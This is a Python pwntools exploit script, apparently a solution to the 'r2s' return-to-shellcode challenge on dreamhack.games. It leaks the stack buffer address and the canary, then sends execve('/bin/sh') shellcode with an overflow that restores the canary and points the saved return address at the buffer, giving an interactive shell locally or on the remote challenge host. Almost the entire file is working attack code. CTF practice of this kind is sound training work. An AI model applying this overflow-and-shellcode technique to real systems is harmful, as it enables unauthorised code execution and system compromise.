#!/usr/bin/env python3

from pwn import *

exe = ELF('r2s', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+190

        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 9221)
else:
    p = process([exe.path])
GDB()

### STAGE 1: Leak buffer address + Canary
p.recvuntil(b'buf: ')
buffer_leak = int(p.recvline()[:-1], 16)
info("Buffer address: " + hex(buffer_leak))

sa(b'Input: ', b'A'*0x59)
p.recvuntil(b"is '" + b'A'*0x58)
canary_leak = u64(p.recv(8)) & ~0xff
info("Canary leak: " + hex(canary_leak))

### STAGE 2: Viet shellcode & Overwrite
shellcode = asm(
    '''
    xor rax, rax
    push rax
    mov rax, 7526411283028599343
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch='amd64'
    )

payload = flat(
    shellcode.ljust(0x58, b'A'),
    p64(canary_leak),
    p64(0), #Saved rbp
    p64(buffer_leak), #Saved rip
    )
sa(b'Input: ', payload)

p.interactive()
